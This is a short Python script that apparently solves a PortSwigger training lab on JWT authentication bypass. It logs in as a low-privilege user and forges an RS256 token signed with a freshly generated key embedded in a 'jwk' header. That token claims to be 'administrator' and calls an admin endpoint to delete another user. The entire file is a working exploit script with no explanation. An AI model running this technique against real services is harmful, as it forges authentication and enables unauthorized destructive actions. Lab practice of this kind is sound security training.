import time
import sys
import requests
import re
import base64
import json
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

from jose import jwk, constants

def base64_url_decode(data):
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + '=' * padding)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    login_url = burp_url + '/login'
    delete_url = burp_url + '/admin/delete?username=carlos'

    session = requests.Session()
    response = session.get(login_url)
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
    csrf = csrf_token_match.group(1)

    burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    session.post(login_url, data=burp_data)

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048,backend=default_backend())
    public_key = private_key.public_key()
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    json_web_token = jwk.RSAKey(
        algorithm=constants.Algorithms.RS256, key=pem.decode()
    ).to_dict()

    payload = {"sub": "administrator", "exp": int(time.time()) + 3600, "iss": "portswigger"}
    token = jwt.encode(
        payload, private_key, algorithm="RS256", headers={"jwk": json_web_token}
    )

    burp_cookie = {"session": token}
    session.get(delete_url, cookies=burp_cookie)
